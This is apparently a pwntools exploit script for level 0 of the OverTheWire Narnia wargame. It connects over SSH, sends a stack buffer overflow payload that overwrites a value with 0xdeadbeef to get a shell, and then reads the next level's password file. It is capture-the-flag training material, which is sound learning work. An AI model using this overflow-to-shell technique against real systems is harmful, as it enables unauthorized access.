#!/usr/bin/env python2

from pwn import *
import time


host = 'narnia.labs.overthewire.org'
level = 0
binary = '/narnia/narnia%i' % level
user = 'narnia%i' % level
passfile = '/etc/narnia_pass/narnia%i' % (level+1)

shell = ssh(host=host, user=user, password="narnia0") #connects to the server

sh = shell.run(binary) #runs the binary

payload = ""
payload += "A"*20
payload += p32(0xdeadbeef) #send the string as little-endian

sh.sendline(payload) # send the payload to the binary
print sh.recv()

time.sleep(2) #sleep to give the program time to crash properly due to potential lag 

sh.sendline('id') #run id on the host
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile) # get the password for the level
log.success('password: ' + sh.recvline().strip())
